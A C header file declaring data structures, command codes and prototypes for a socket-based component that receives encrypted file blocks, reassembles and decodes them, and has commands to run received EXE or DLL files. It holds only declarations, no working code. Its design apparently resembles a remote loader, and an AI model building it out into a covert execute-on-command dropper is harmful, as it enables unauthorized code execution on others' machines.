
#define COMMAND_RUN_EXE		0x00000001
#define COMMAND_RUN_DLL		0x00000002
#define COMMAND_REVICE_FILE	0x00000003
#define COMMAND_SEND_FILE	0x00000004
#define COMMAND_COMPLETE	0x00000005
#define COMMAND_OVER		0x00000006


#define RECV_THREAD_MAXIMUM_NUM		0x64

typedef struct _CHECK_COMMAND
{
	ULONG ulCommand;
}CHECK_COMMAND,*PCHECK_COMMAND;

typedef struct _RANDOM_BLOCK
{
	LIST_ENTRY ListRandomBlock;
	ULONG ulIndex;
	PCHAR pCryptDat;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
}RANDOM_BLOCK,*PRANDOM_BLOCK;

typedef struct _RECV_FILE_INFO 
{
	LIST_ENTRY List;
	LIST_ENTRY RandomBlockList;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsCrypt;
	BOOLEAN bIsWrited;
	WCHAR wFileName[MAX_PATH];
	WCHAR wFileFullPath[MAX_PATH];
	WCHAR wMoveFilePath[MAX_PATH];
}RECV_FILE_INFO,*PRECV_FILE_INFO;

typedef struct _RECV_RANDOM_BLOCK
{
	ULONG ulIndex;
	ULONG_PTR ulCryptDatLength;
	ULONG ulOffset;
}RECV_RANDOM_BLOCK,*PRECV_RANDOM_BLOCK;

typedef struct _RECV_FILE_DAT
{
	CHECK_COMMAND CmdLine;
	BYTE FileHash[32];
	ULONG_PTR ulFileSize;
	ULONG_PTR ulRandomCount;
	BOOLEAN bIsCrypt;
	WCHAR wFileName[MAX_PATH];
}RECV_FILE_DAT,*PRECV_FILE_DAT;
typedef struct _RECV_SOCKET
{
	LIST_ENTRY ListSocket;
	SOCKET socket;
	SOCKADDR_IN ServerAddr;
	BOOLEAN bIsWork;
	BOOLEAN bIsOk;
}RECV_SOCKET,*PRECV_SOCKET;

extern LIST_ENTRY g_RecvFileList;
extern LIST_ENTRY g_RecvSocket;
extern CRITICAL_SECTION g_CriticalSection;
extern CRITICAL_SECTION g_CriticalSection_Socket;
extern BOOLEAN g_bInitSocket;
extern ULONG g_ulRecvThreadCount;
extern WCHAR g_wCurPath[MAX_PATH];
extern WCHAR g_wRecvPath[MAX_PATH];
extern WCHAR g_wMoveFilePath[MAX_PATH];

DWORD RecvData(LPVOID lpParameter);
DWORD DelRecvList(LPVOID lpParameter);
ULONG_PTR RecvFileInfo(PRECV_FILE_DAT pRecvFileDat,PRECV_SOCKET pRecvSocket,PRECV_FILE_INFO pRecvFileInfo);
ULONG_PTR Commander(PRECV_SOCKET pRecvSocket);
ULONG_PTR FixRecvFiles(PRECV_FILE_INFO pRecvFileInfo);
ULONG_PTR DecodeFile(PRECV_FILE_INFO pRecvFileInfo);
DWORD RecvWorkThread(LPVOID lpParameter);